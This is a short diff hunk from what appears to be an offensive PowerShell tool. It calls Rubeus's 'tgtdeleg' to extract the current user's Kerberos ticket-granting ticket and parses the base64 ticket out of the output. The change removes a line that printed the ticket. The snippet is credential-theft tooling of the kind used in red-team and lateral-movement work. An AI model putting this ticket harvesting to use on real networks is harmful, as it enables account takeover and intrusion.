@@ -353,7 +353,7 @@ IF (!$CurrentUser){
 IF ($Method -ne "RDP" -and $SourceDomain -eq "") {
     $Ticket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
     $OriginalUserTicket = $Ticket.Substring($Ticket.IndexOf('doI')).Trim()
-    Write-Host $OriginalUserTicket
+
 
     # Check if Password or Hash has been provided
     # Update module to include a function to error if both values or none have been provided.
